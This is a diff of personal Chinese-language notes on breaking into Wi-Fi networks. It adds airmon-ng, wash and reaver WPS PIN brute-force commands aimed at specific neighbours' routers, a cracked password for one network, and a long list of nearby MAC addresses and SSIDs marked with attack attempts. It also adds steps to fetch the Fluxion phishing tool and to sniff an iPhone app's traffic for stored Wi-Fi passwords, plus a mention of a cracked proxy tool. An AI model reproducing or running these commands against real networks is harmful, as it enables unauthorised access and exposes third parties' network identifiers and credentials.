@@ -427,9 +427,8 @@
 
 如果发送pin码过快，有可能造成路由器崩溃；就类似对服务器的DDOS攻击。
 
-🔅 airmon-ng start wlan0   开启无线网卡监控模式   
+🔅 airmon-ng start wlan0 && wash -i wlan0mon  开启无线网卡监控模式 并  查看四周开启wps的 wifi  
 🔅 airodump-ng wlan0mon    查看四周所有 wifi      
-🔅 wash -i wlan0mon -C     查看四周开启wps的 wifi      
 
 BSSID                  Channel       RSSI       WPS Version       WPS Locked        ESSID
 ------------------------------------------------------------------------------------------
@@ -459,6 +458,15 @@ wps locked 下是no  ➜  wps 没有被关闭.  ➜ 也就是说wps是开启的.
     [+] AP SSID: 'MERCURY_210'
 
       👹 njs236121 就是wifi密码了!!!!  等了8.8小时.
+
+
+
+
+
+
+
+
+
 
 
 
@@ -502,6 +510,95 @@ wps locked 下是no  ➜  wps 没有被关闭.  ➜ 也就是说wps是开启的.
 　　  - WPS功能对个人基本上没啥作用，还是关了吧。
 　　  - 现在的路由一般会有防pin措施，例如会有300秒pin限制，但这个是伪防pin,作用不是很大
 
+
+
+
+reaver -i wlan0mon -b A8:57:4E:A7:47:2C -vv
+
+7C:08:D9:DB:2C:CA   1  00  1.0  No   ChinaNGB-602
+28:6C:07:43:98:8C   1  00  1.0  No   Tommy's appartment
+38:83:45:FD:82:12   1  00  1.0  No   tingting
+E0:28:61:7D:9A:A8   1  00  1.0  No   ChinaNet-fmWT
+08:10:7A:1D:9E:A7   1  00  1.0  No   ChinaNet-2.4G-Home  HuA
+D4:67:E7:0F:1B:59   1  00  1.0  No   ChinaNet-iPTy
+98:BC:57:6C:C1:B3   1  00  1.0  No   ChinaNGB-YdXfJX
+D0:60:8C:41:B0:EA   3  00  1.0  No   ChinaNet-m77z
+F0:B4:29:D1:69:C3   3  00  1.0  No   5G就是它               ❌.WARNING: Receive timeout occurred
+FC:19:D0:4C:0E:6A   3  00  1.0  No   ChinaNGB-1607
+00:E0:01:00:FD:84   4  00  1.0  No   vYou_DDPai_mini2
+A0:91:C8:49:96:AE   5  00  1.0  No   ChinaNet-4JQw
+F4:CB:52:07:9C:FC   5  00  1.0  No   HUAWEI-4ARMLN
+EC:88:8F:54:66:60   6  00  1.0  No   wqs12
+8C:21:0A:90:08:AC   6  00  1.0  No   MERCURY_9008AC
+60:BB:0C:61:38:0E   6  00  1.0  No   ChinaNet-yQu6
+14:75:90:C7:9A:02   6  00  1.0  No   lulu
+BC:D1:77:B3:11:C0   6  00  1.0  No   TP-LINK_B311C0
+D4:A1:48:92:30:C4   6  00  1.0  No   appleshi_2.4G
+14:75:90:08:4D:5E   6  00  1.0  No   lys               ❌. timeout... WARNING: Receive timeout occurred
+D4:61:2E:BE:61:33   6  00  1.0  No   HUAWEI-KTNNYX
+5C:63:BF:FE:8A:B8   8  00  1.0  No   ChinaNet-8AB8     ✔ ?? .... 信号不好么...  买!!
+F0:B4:29:E6:D2:C1   8  00  1.0  No   Xiaomi_D2C0
+D0:60:8C:42:F6:9A  10  00  1.0  No   ChinaNet-3KXp
+BC:D1:77:49:38:7A  11  00  1.0  No   TP-LINK_49387A
+E0:28:61:81:FA:20  11  00  1.0  No   ChinaNet-UXjM
+A8:57:4E:A7:47:2C  11  00  1.0  No   UU          ❌. timeout... WARNING: Receive timeout occurred              
+80:D4:A5:29:85:28  11  00  1.0  No   CU_GKB2
+C4:C7:55:0F:85:31  11  00  1.0  No   ChinaNet-9d2f
+FC:19:D0:3E:45:2F  11  00  1.0  No   ChinaNGB-Lja7VQ
+D4:AD:2D:01:F6:95  11  00  1.0  No   ChinaNet-i7kp
+78:C1:A7:0B:88:4E  11  00  1.0  No   ZTE-2.4G-0B884E
+00:24:A5:34:C1:CD  11  00  1.0  No   zjhBuffalo-G-TKIP
+7C:08:D9:B5:FD:6E  12  00  1.0  No   ChinaNGB-1710
+98:BC:57:70:62:A9  13  00  1.0  No   ChinaNGB-YdM7rV
+28:6C:07:DB:6B:F1  13  00  1.0  No   Xiaomi_6BF0
+7C:08:D9:B6:A6:5B  13  00  1.0  No   ChinaNGB-1610
+44:6E:E5:96:9F:44   1  00  1.0  No   HUAWEI-CJD44D
+98:BC:57:3B:D3:7A   1  00  1.0  Yes  ChinaNGB-YDDeCa
+08:3F:BC:B0:B1:ED   4  00  1.0  No   ChinaNet-V7Su
+50:BD:5F:05:22:F2   6  00  1.0  No   TP-LINK_22F2
+60:BB:0C:DB:33:ED   6  00  1.0  No   ChinaNet-2XSV
+F0:B4:29:21:07:A5  11  00  1.0  No   G-family
+98:F4:28:01:69:4E  11  00  1.0  No   ChinaNet-WG2t
+98:BC:57:6C:E5:50  12  00  1.0  No   ChinaNGB-YdcC6d
+6C:59:40:14:58:A8   1  00  1.0  No   MERCURY_58A8
+68:9F:F0:5A:B8:2D   1  00  1.0  No   ChinaNet-HiAA
+9C:21:6A:F9:E9:F5   1  00  1.0  No   xiaokeai              ....  ❌ ❌
+98:BC:57:72:43:9C   3  00  1.0  No   ChinaNGB-YdeK7p
+28:6C:07:CC:CD:A8   3  00  1.0  No   Xiaomi_CDA7
+D0:60:8C:42:B2:B7   1  00  1.0  No   ChinaNet-sy43
+7C:08:D9:B6:85:76   2  00  1.0  No   ChinaNGB-CHHkXB
+14:75:90:4D:16:C6   6  00  1.0  No   TP888888
+60:BB:0C:B3:3A:E0   6  00  1.0  No   ChinaNet-RtVF
+F0:B4:29:E6:A7:FE   8  00  1.0  No   Xiaomi_1902
+54:BE:53:5A:B9:47  11  00  1.0  No   ChinaNet-6xkb
+98:BC:57:6C:E4:FC  12  00  1.0  No   ChinaNGB-Yd2SQK
+98:BC:57:5B:A5:7E  13  00  1.0  No   ChinaNGB-Yd7TU2
+00:16:78:4D:D2:78   3  00  1.0  No   JYJS
+7C:08:D9:E7:17:D1   1  00  1.0  No   ChinaNGB-321
+68:9F:F0:5A:98:F5   8  00  1.0  No   ChinaNet-X3ey
+BC:D1:77:29:EC:A0   1  00  1.0  No   Wu LieJian
+18:44:E6:73:CA:CF   1  00  1.0  No   ChinaNet-VTka      ❌ ❌
+F4:B8:A7:6C:34:BC   6  00  1.0  No   ChinaNet-TA5N
+F4:B8:A7:68:2C:B0   8  00  1.0  No   ChinaNet-aSsQ
+08:10:7A:28:99:0E  11  00  1.0  No   ChinaNet-2.4G-990E
+D0:C7:C0:5F:91:3C  11  00  1.0  No   TP-LINK_913C
+7C:08:D9:D6:08:FE   1  00  1.0  No   ChinaNGB-KiTN
+8E:BE:BE:26:A7:D3  10  00  1.0  No   Xiaomi_Hello_adDx
+F0:B4:29:FE:38:53   1  00  1.0  No   小米666
+10:6F:3F:DA:4D:A4   8  00  1.0  No   106F3FDA4DA4-1
+F4:CB:52:09:BE:50   3  00  1.0  No   2201
+28:6C:07:67:42:6E   4  00  1.0  No   Xiaomi_426D
+08:3F:BC:BC:07:EF   5  00  1.0  No   ChinaNet-cVjp
+F4:EE:14:00:93:DC  11  00  1.0  No   MERCURY
+E0:28:61:C3:59:AC   5  00  1.0  No   ChinaNet-wqD6
+8C:BE:BE:26:A7:D1  10  00  1.0  No   Xiaomi_A7D0
+D4:67:E7:0C:AC:B1   1  00  1.0  No   ChinaNet-a9MG
+
+
+
+实例2 18:44:E6:73:CA:CF   1  00  1.0  No   ChinaNet-VTka
+🔅 reaver -i wlan0mon -b 18:44:E6:73:CA:CF -vv
+后面不能加 -a 不知为什么..  开始等吧..
 
 
 
@@ -937,6 +1034,12 @@ wps locked 下是no  ➜  wps 没有被关闭.  ➜ 也就是说wps是开启的.
     git clone https://github.com/Xu-Jian/fluxion
     cd fluxion && ls
     ./fluxion
+
+
+
+git clone https://github.com/FluxionNetwork/fluxion
+这个是官网的. 有时候下载不了. 最新版本 最好翻墙去这里下!!!
+
 
     这里的命令 不能在ssh中执行.需要到虚拟机中去..
 
@@ -1624,6 +1727,221 @@ Hack it！
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+wifi 破解2 . 之前的wifi 有时候会断...  莫名其妙的..  再破解一个..
+
+🔵 ios 查看万能钥匙密码
+
+tplink 云功能... 
+
+如果，你的tp link路由器登录界面只有一个登录密码的文本框，那么这个型号的路由器就是没有默认密码的，因为在第一次设置的时候，就需要自己设置一个登录密码。如果这个时候记不起来登录密码，只能是重置路由器了。
+
+
+
+
+
+
+
+
+
+
+
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+3070+6649 
+
+Mac 安装3070网卡驱动:
+
+参考文章1:  https://www.tonymacx86.com/threads/guide-installation-of-usb-wireless-antenna-chipset-rt2870-rt3070-in-mac-os-x-10-11-x-el-capitan.183175/
+参考文章2:  http://www.xuenb.com/os/1486906623102251.html
+
+
+下载 BearExtender 5.4              管理wifi的.
+下载 EasyKext Utility              安装驱动的.
+下载 RT2870USBWirelessDriver.kext  实际驱动
+
+
+Installation (software)
+1) Remove workaround first - RESTART
+2) Remove old files - RESTART
+如果之前没有安装过 BearExtender 那么可以跳过上面两步.
+
+3) Install 5.4 (BearExtender) - DONT RESTART YET!
+安装好后 不要点重启. 先把网卡插上.安装驱动后再重启.
+4) Connect the USB Wireless Antenna
+
+
+Installation (driver)
+5) Run EasyKext Utility
+6) Drag RT2870USBWirelessDriver.kext to it - RESTART
+
+现在开机就出来个 无线管理界面. 选择一个就可以了!!!
+
+
+下面来测试
+
+
+3070 Mac 驱动.
+
+用 bearextender 5.4 来安装驱动.
+https://store.bearextender.com/pages/regarding-yosemite-compatiblity
+
+
+
+
+
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+
+
+
+🔵 MAC抓 IOS 万能钥匙 里面的密码!
+
+	❗️❗️❗️ 要抓iphone上的数据包 稍微有点不同 ❗️❗️❗️
+	❗️❗️❗️ 要抓iphone上的数据包 稍微有点不同 ❗️❗️❗️
+	❗️❗️❗️ 要抓iphone上的数据包 稍微有点不同 ❗️❗️❗️
+	按之前的办法 只能抓到 毫无作用的 mdns包. 根本没有ftp/tcp等等包.
+	最佳方式: 用 rvictl命令.  需要安装 xcode!!!
+
+	1、手机通过usb线连接到PC
+
+	2、查看手机的UDID(设备唯一标识码): http://www.jianshu.com/p/20dbffe6a45d
+
+	3. 终端去建立连接:		rvictl -s aff56c5351843780baa88d00237ea275d0639e5d
+          Starting device aff56c5351843780baa88d00237ea275d0639e5d [SUCCEEDED] with interface rvi0
+
+          这样，PC上就多了一个虚拟的端口rvi0
+          现在 wireshark 可以选项里就多了一个rvi0网卡了!!!
+
+
+
+下拉来说 怎么抓包.
+
+
+先iphone 开启3g/4g 移动数据.  并给 wifi万能钥匙上网权限.
+开始抓包.  选择一个有万能钥匙的wifi. 如果之前连过这个wifi 就手动忘记密码.
+这样才能从 万能钥匙的数据库 重新获取 wifi密码..
+
+开始连接wifi 到 成功连接wifi.  抓到 400+ 个包.  wifi 账户密码在哪..
+初步过滤 not mdns && not icmp && not ipv6
+
+程序和服务器通信 好像要先 
+client hello
+server hello
+证书
+传输数据.
+
+
+
+
+先看wifi名字.linksys
+
+
+首先查.. 万能钥匙的服务器ip.
+打开万能钥匙上网. 抓数据包.  好像是 
+106.75.60.77    
+106.75.70.207
+10.171.118.93
+
+
+
+
+屏蔽了一个，屏蔽不了所有 APP ，你还不如直接过滤掉所有包含你 wifi 密码的请求（出口外网屏蔽掉，内网放行，应该不会影响日常使用）
+Google Play 搜 Packet Capture ，手动找。
+我记得有些路由器支持访客的临时密码哒。。。客人一走，关闭临时密码。。。这样更不用捣鼓。
+
+屏蔽服务器也没用。 
+密码输入过一次就记录在手机里，人家用你 WIFI 的时候无法分享。但是出去用其它网络的时候，还是可以分享记录过的 WIFI 。
+
+深受其害，总是有同事装这个 app ，搞得公司 wifi 巨慢，说又不好说，唉
+
+
+1)  首先将MAC电脑的以太网共享给airport，使iOS设备能够通过wifi连接
+
+打开系统偏好设置，找到共享，选择internet共享，在右侧“通过以下方式将”选择以太网，“连接共享给其他电脑”选择airPort。
+
+2)  打开paros ，设置paros的本地代理paros下载地址（http://www.parosproxy.org/）
+
+在paros的tools－》options中选择local proxy，在Address 中输入AirPort的ip地址。输入端口8080。打开系统偏好设置，找到网络，选择左侧的AirPort，可以看到AirPort的地址为169.254.69.225，将该地址填入到上面提到的Address栏中。
+
+3)  使用ios设备连接mac共享出来的网络：在iOS设备中，选择设置－》通用－》网络－》wifi，找到共享的网络，加入。然后在该网络的纤细内容中的http代理部分，选择手动，输入paros中设置的代理ip和端口。
+
+4)  下面就可以使用paros来监控iOS设备的网络，我们打开Safiri，在paros中即可察看到网络的所有请求。
+
+
+
+
+
+
+
+很明显，这几条黑色的包和它们下面的包，就是应用的请求和服务器的回应了。我们点击其中一条请求，看看它的请求格式：
+看到没有？Full Request URI，就是请求的网址。双击它，在浏览器中打开，可以看到是一条json数据，哈哈，初步成功！
+
+总结一下基本方法：让iPhone通过笔记本联网，然后使用Wireshark抓包，通过过滤器过滤抓到的包，找到请求地址，分析请求格式。over！
+
+
+估计数据包被加密了..
+
+
+network={
+    ssid=
+    key = 
+    psk = 
+
+}
+
+
+...
+
+
+
+
+
+对了 开发 IOS的app 是需要证书的. 所有数据从iphone app 到app服务器 应该是经过加密的....
+
+怎么看数据是否被加密. md5 rsa 
+
+数据的安全性至关重要，而仅仅用 POST 请求提交用户的隐私数据，还是不能完全解决安全问题。因此：我们经常会用到加密技术，比如说在登录的时候，我们会先把密码用 MD5 加密再传输给服务器 或者 直接对所有的参数进行加密再 POST 到服务器。
+
+
+
+1.数据安全介绍
+
+最基础的是我们发送网络请求时，使用get和post方式发送请求。两者具体区别就不做解释了，只是引出相关安全性问题
+
+get：将参数暴露在外，（绝对不安全-->明文请求或者傻瓜式请求）。
+post：将参数放到请求体body中，（相对于get比较安全-->但是我们可以很容易用一些软件截获请求数据。比如说Charles（青花瓷））
+Charles（大部分app的数据来源都使用该工具来抓包，并做网络测试）
+
+注意：Charles在使用中的乱码问题，可以显示包内容，然后打开info.plist文件，找到java目录下面的VMOptions，在后面添加一项：-Dfile.encoding=UTF-8
+这里提供一个青花瓷破解版下载途径，供大家学习使用，商务需求，也请支持正版。
+数据安全的原则
+
+在网络上不允许传输用户隐私数据的明文,（即:App网络传输安全，指对数据从客户端传输到Server中间过程的加密，防止网络世界当中其他节点对数据的窃听）。
+在本地不允许保存用户隐私数据的明文,（即:App数据存储安全，主要指在磁盘做数据持久化的时候所做的加密）。
+App代码安全,（即:包括代码混淆，加密或者app加壳）。
+要想非常安全的传输数据，建议使用https。抓包不可以，但是中间人攻击则有可能。建议双向验证防止中间人攻击，可以参考下文篇章。
 
 
 
